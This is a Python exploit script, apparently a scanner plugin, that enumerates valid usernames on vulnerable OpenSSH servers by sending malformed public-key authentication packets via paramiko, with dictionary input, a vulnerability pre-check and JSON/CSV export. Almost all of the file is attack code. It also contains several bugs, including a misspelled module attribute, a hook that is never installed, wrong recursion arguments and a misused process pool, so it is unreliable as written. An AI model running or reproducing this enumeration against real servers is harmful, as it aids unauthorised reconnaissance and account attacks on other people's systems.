import paramiko
import socket
import string
import sys
import random
import multiprocessing
import argparse
import json


old_parse_service_accept = paramiko.auth_hanlder.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]

random_username_list = []

for i in range(3):
    user = "".join(random.choice(string.ascii_lowercase) for x in range(random.randint(15, 20)))
    random_username_list.append(user)


class BadUsername(Exception):
    def __init__(self):
        pass


def add_boolean(*args, **kwargs):
    pass


def call_error(*args, **kwargs):
    raise BadUsername()


def maltorm_packet(*args, **kwargs):
    old_add_boolean = paramiko.message.Message.add_boolean
    paramiko.message.Message.add_boolean = add_boolean()
    result = old_parse_service_accept(*args, **kwargs)
    paramiko.message.Message.add_boolean = old_add_boolean
    return result
def checkUsername(username,hostname,port,tried=0):
    sock= socket.socket()
    sock.connect((hostname,port))
    transport=paramiko.transport.Transport(sock)
    try:
        transport.start_client()
    except paramiko.ssh_exception.SSHException:
        # server was likely flooded, retry up to 3 times
        transport.close()
        if tried < 4:
            tried += 1
            return checkUsername(username, tried)
        else:
            print('[-] Failed to negotiate SSH transport')
    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
    except BadUsername:
            return (username, False)
    except paramiko.ssh_exception.AuthenticationException:
            return (username, True)
    #Successful auth(?)
    raise Exception("There was an error. Is this the correct version of OpenSSH?")

def checkVulnerable(hostname,port):
    vulnerable = True
    for user in random_username_list:
        result = checkUsername(user,hostname,port)
        if result[1]:
            vulnerable = False
    return vulnerable
def exportJSON(results):
    data = {"Valid":[], "Invalid":[]}
    for result in results:
        if result[1] and result[0] not in data['Valid']:
            data['Valid'].append(result[0])
        elif not result[1] and result[0] not in data['Invalid']:
            data['Invalid'].append(result[0])
    return json.dumps(data)

def exportCSV(results):
    final = "Username, Valid\n"
    for result in results:
        final += result[0]+", "+str(result[1])+"\n"
    return final

def exportList(results):
    final = ""
    for result in results:
        if result[1]:
            final+=result[0]+" is a valid user!\n"
        else:
            final+=result[0]+" is not a valid user!\n"
    return final

def check(hostname,port,dict):
    sock=socket.socket()
    ret = {'success': False, 'response': [], 'requests': [], 'error': [], 'info': []}
    try:
        sock.connect((hostname,port))
        sock.close()
    except:
        print('[-] Connecting to host failed. Please check the specified host and port.')
        sys.exit(1)

    if not checkVulnerable(hostname,port):
        print("Target host most probably is not vulnerable or already patched, exiting...")
        sys.exit(0)
    with open(dict) as f:
        usernames = map(str.split,f.readlines())
        pool =multiprocessing.Pool(5)
        result=pool.map(checkUsername,hostname,port,usernames)
        ret['info']=result
        ret['success']=True


def main(params):
    result = params.get('result',{})
    url=params.get('url','')
    headers=params.get('headers',{})
    proxies=params.get('proxies',None)      #代理
    timeout=params.get('timeout',5)           #超时时间
    hostname=params.get('hostname','')
    port=params.get('port','22')
    dict=params('dict','')
    result = check(hostname,port,dict)

    return result


if __name__ == '__main__':
    params = {
        'result': {'success': False, 'response': [], 'requests': [], 'error': []},
        # headers：传入的header参数
        'headers': {},
        # proxy：传入的代理服务器参数
        'proxies': {'protocol': 'http', 'ip': '127.0.0.1', 'port': 8080},
        'timeout': 30,
        ###可选参数###
        'hostname': "192.168.160.201",
        "port":"22"
    }
    print(main(params))






